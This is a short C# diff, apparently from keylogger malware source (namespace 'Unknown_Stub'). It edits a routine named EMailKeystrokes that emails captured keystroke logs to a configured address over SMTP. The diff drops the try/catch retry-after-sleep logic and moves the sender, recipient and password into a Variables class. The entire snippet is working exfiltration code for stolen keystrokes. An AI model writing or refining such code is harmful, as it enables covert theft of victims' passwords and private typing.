@@ -158,16 +158,10 @@ namespace Unknown_Stub
         #region SMTP
         internal static void EMailKeystrokes(string Keystrokes)
         {
-            try
-            {
+         
                 EMailCount++;
-                SMTP.SendMail(EMailFrom, EMailTo, Variables.SMTPServer, Variables.SMTPPort, EMailPassword, Subject, Keystrokes);
-            }
-            catch (Exception)
-            {
-                System.Threading.Thread.Sleep(25000);
-                EMailKeystrokes(Convert.ToString(KeystrokeLogs));
-            }
+                SMTP.SendMail(Variables.MailFrom, Variables.MailTo, Variables.SMTPServer, Variables.SMTPPort, Variables.MailPassword, Subject, Convert.ToString(KeystrokeLogs));
+           
         }
 
         #endregion
